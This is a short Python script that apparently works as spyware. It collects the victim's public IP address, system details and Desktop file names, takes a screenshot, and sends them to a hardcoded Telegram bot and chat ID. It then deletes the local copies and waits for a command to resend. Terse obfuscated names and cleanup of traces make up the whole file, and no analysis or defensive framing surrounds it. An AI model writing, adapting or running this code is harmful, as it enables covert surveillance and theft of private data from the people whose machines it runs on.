import os
import json
import platform
import requests
import telebot
import pyautogui
from PIL import Image

Tkkn=os.getenv("Tkkn", "7861908704:AAHV77cxm1CaatH3Dli6CNAZsAPr6O5BfyE")
btt = telebot.TeleBot(Tkkn)
df = "a.json"
sft = "a.png"
def get_id():
    try:
        response = requests.get("https://api64.ipify.org?format=json")
        id = response.json()
        return id["ip"]
    except Exception as e:
        return f"{e}"
def ginf():
    return {"system": platform.system(),"node": platform.node(),"release": platform.release(),"version": platform.version(),"machine": platform.machine(),"processor": platform.processor()}
def gfn():
    dpp = os.path.join(os.environ["USERPROFILE"], "Desktop")
    return [f for f in os.listdir(dpp)if os.path.isfile(os.path.join(dpp, f))]
def css(): pyautogui.screenshot().save(sft)
def collect_data(): return {"1": get_id(), "2": ginf(), "3": gfn()}
def sdf(data):
    with open(df, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4)
def ldff():
    if os.path.exists(df):
        with open(df, "r", encoding="utf-8") as file:
            return json.load(file)
    return None
def ddf():
    if os.path.exists(df): os.remove(df); os.remove(sft)
def sdvb(data, msrc=None):
    if not msrc:
        msrc = "?xml version=1.0"
    json_data = json.dumps(data, indent=4)
    try:
        btt.send_message(chat_id=6697995740, text=f"{msrc}\n\n```{json_data}```", parse_mode="Markdown")
        if os.path.exists(sft):
            with open(sft, "rb") as scr:
                btt.send_photo(chat_id=6697995740, photo=scr)
    except Exception as e:
        print(f"{e}")
data = collect_data()
sdf(data)
css()
sdvb(data)
ddf()
@btt.message_handler(commands=["w"])
def ssddd(msd):
    data = ldff()
    if data:
        sdvb(data, msrc="s")
        ddf()
    else:
        btt.reply_to(msd)
btt.polling()